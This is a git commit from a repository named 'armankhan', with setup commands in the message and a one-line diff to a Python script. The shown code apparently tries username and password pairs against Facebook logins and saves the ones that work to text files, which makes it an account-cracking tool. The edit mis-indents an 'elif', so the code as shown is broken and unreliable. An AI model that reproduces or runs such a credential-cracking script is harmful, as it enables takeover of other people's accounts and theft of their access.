19db6075d6b4f4b871efe1a29bf4fca8e21bb9c5
armankhan2k56-creator <armankhan2k56@gmail.com>
2026-09-02 19:42:21 +0500

    Update armankhan.py
    cd ~
    rm -rf armankhan
    git clone https://github.com/armankhan2k56-creator/armankhan.git
    cd armankhan
    python armankhan.py

--- armankhan.py
+++ armankhan.py
@@ -900,7 +900,7 @@ po = ses.get(url, headers=headers)
             self.ok.append("%s|%s"%(uid, pw))
             open("2009-salma-Ok.txt","a").write("%s|%s\n"%(uid, pw))
             break
-        elif "www.facebook.com" in po.text:
+            elif "www.facebook.com" in po.text:
             print("\r \033[0;92m[ salma-OK ] %s | %s\033[0;97m"%(uid, pw))
             self.cp.append("%s|%s"%(uid, pw))
             open("2009-salma-OK.txt","a").write("%s|%s\n"%(uid, pw))
